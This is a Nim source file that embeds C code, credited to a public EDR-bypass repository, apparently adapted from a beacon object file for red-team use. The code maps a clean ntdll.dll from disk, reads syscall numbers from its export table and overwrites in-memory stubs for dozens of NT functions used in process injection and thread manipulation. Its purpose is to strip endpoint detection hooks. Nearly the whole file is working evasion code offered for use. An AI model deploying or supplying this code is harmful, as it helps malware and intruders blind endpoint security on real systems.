# Source: https://github.com/Mr-Un1k0d3r/EDRs/blob/main/unhook_bof.c
# A few slight changes were made, removing beacon-specific code and resolvers as well as ETW patching (done elsewhere)

{.emit: """

#include <Windows.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>


VOID *GetFileFromDisk(CHAR *name, HANDLE *hFile, HANDLE *hMap) {
        VOID *data = NULL;
        HANDLE localHFile = *hFile;
        HANDLE localHMap = *hMap;
        localHFile = CreateFile(name, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        localHMap = CreateFileMapping(localHFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
        data = MapViewOfFile(localHMap, FILE_MAP_READ, 0, 0, 0);

        hFile = &localHFile;
        hMap = &localHMap;

        return data;
}

VOID PatchAPI(VOID *lib, CHAR *name, HANDLE hDll, BOOL *displayed) {	
    DWORD dwIter = 0;
    CHAR* base = lib;
    CHAR* PE = base + (unsigned char)*(base + 0x3c);
    DWORD ExportDirectoryOffset = *((DWORD*)PE + (0x8a / 4));
    CHAR* ExportDirectory = base + ExportDirectoryOffset;
    DWORD dwFunctionsCount = *((DWORD*)ExportDirectory + (0x14 / 4));
    DWORD OffsetNamesTableOffset = *((DWORD*)ExportDirectory + (0x20 / 4));
    DWORD* OffsetNamesTable = base + OffsetNamesTableOffset;
    DWORD OffsetOrdinals = *((DWORD*)ExportDirectory + (0x24 / 4));
    WORD* ordinals = base + OffsetOrdinals;
    DWORD OffsetFunctions = *((DWORD*)ExportDirectory + (0x1c / 4));
    DWORD* functions = base + OffsetFunctions;

	if(!*displayed) {
		printf("------------------------------------------\nBASE\t\t\t0x%p\t%s\nPE\t\t\t0x%p\t%s\nExportTableOffset\t\t0x%p\nOffsetNameTable\t\t0x%p\nOrdinalTable\t\t0x%p\nFunctionTable\t\t0x%p\nFunctions Count\t\t0x%x (%d)\n------------------------------------------\n",
		base, base, PE, PE, ExportDirectory, OffsetNamesTable, ordinals, functions, dwFunctionsCount, dwFunctionsCount);
		*displayed = TRUE;
	}
	
    for(dwIter; dwIter < dwFunctionsCount - 1; dwIter++) {
        DWORD64 offset = *(OffsetNamesTable + dwIter);
        CHAR* current = base + offset;
        if(strcmp(current, name) == 0) {
            WORD offsetInOrdinal = *(ordinals + dwIter);
            DWORD function = *(functions + offsetInOrdinal);
            CHAR *func = base + function + 4;
            DWORD *data = (DWORD*)func;
            DWORD syscallID = *data;
            unsigned char id = syscallID;
            unsigned char high = syscallID >> 8;
			
            FARPROC toPatchAddr = GetProcAddress(hDll, name);
			
			printf("%s syscall ID is 0x%02x%02x. Real %s is at 0x%p\n", name, (unsigned char)high, (unsigned char)id, name, toPatchAddr);
			
            PatchHook(toPatchAddr, id, high);
            break;
        }
    }
	
}

VOID PatchHook(CHAR* address, unsigned char id, char high) {
    DWORD dwSize = 11;
    CHAR* patch_address = address;
	CHAR* patch = GlobalAlloc(GPTR, dwSize);
    sprintf(patch, "\x4c\x8b\xd1\xb8%c%c%c%c\x0f\x05\xc3", id, high, high ^ high, high ^ high);

    DWORD dwOld;
    VirtualProtect(patch_address, dwSize, PAGE_EXECUTE_READWRITE, &dwOld);
    memcpy(patch_address, patch, dwSize);
    VirtualProtect(patch_address, dwSize, PAGE_EXECUTE_READ, &dwOld);
	GlobalFree(patch);	
}

int go(char *args, int length) {
	printf("Loading the unhooking module\n");

    CHAR dll[] = "C:\\windows\\system32\\ntdll.dll";
    HANDLE hFile = NULL;
    HANDLE hMap = NULL;
    HANDLE hDll = LoadLibrary(dll);
	BOOL displayed = FALSE;
	
    printf("Opening %s\n", dll);
	
    VOID *data = GetFileFromDisk(dll, &hFile, &hMap);
    
	PatchAPI(data, "NtProtectVirtualMemory", hDll, &displayed); // should always be first
	PatchAPI(data, "NtMapViewOfSection", hDll, &displayed);
	PatchAPI(data, "NtMapViewOfSectionEx", hDll, &displayed);
	PatchAPI(data, "NtOpenProcess", hDll, &displayed);
	PatchAPI(data, "NtAllocateVirtualMemory", hDll, &displayed);
	PatchAPI(data, "NtAllocateVirtualMemoryEx", hDll, &displayed);
	PatchAPI(data, "NtGetContextThread", hDll, &displayed);
	PatchAPI(data, "NtQueryInformationThread", hDll, &displayed);
	PatchAPI(data, "NtQueueApcThread", hDll, &displayed);
	PatchAPI(data, "NtQueueApcThreadEx", hDll, &displayed);
	PatchAPI(data, "NtReadVirtualMemory", hDll, &displayed);
	PatchAPI(data, "NtResumeThread", hDll, &displayed);
	PatchAPI(data, "NtSetContextThread", hDll, &displayed);
	PatchAPI(data, "NtSetInformationProcess", hDll, &displayed);
	PatchAPI(data, "NtSetInformationThread", hDll, &displayed);
	PatchAPI(data, "NtSuspendThread", hDll, &displayed);
	PatchAPI(data, "NtUnmapViewOfSection", hDll, &displayed);
	PatchAPI(data, "NtUnmapViewOfSectionEx", hDll, &displayed);
	PatchAPI(data, "NtWriteVirtualMemory", hDll, &displayed);
	PatchAPI(data, "NtCreateThreadEx", hDll, &displayed);
	PatchAPI(data, "NtCreateThread", hDll, &displayed);
	PatchAPI(data, "NtCreateUserProcess", hDll, &displayed);
	PatchAPI(data, "NtCreateProcess", hDll, &displayed);
	PatchAPI(data, "NtCreateProcessEx", hDll, &displayed);
	PatchAPI(data, "NtAlertResumeThread", hDll, &displayed);
	PatchAPI(data, "NtQuerySystemInformation", hDll, &displayed);
	PatchAPI(data, "NtQuerySystemInformationEx", hDll, &displayed);
	PatchAPI(data, "NtCreateFile", hDll, &displayed);
	PatchAPI(data, "NtCreateKey", hDll, &displayed);
	PatchAPI(data, "NtOpenKey", hDll, &displayed);
	PatchAPI(data, "NtOpenFile", hDll, &displayed);
	PatchAPI(data, "NtTerminateThread", hDll, &displayed);
	PatchAPI(data, "NtSetValueKey", hDll, &displayed);
	PatchAPI(data, "NtOpenKeyEx", hDll, &displayed);
	PatchAPI(data, "NtDeleteFile", hDll, &displayed);
	PatchAPI(data, "NtDeleteKey", hDll, &displayed);
	PatchAPI(data, "NtDeleteValueKey", hDll, &displayed);

  CloseHandle(hFile);
  CloseHandle(hMap);
	 
	printf("Everything should be unhooked in the process with PID: %d\n", GetCurrentProcessId());

  return 0;
}

""".}

proc UnhookNTDLL*(): int
    {.importc: "go", nodecl.}


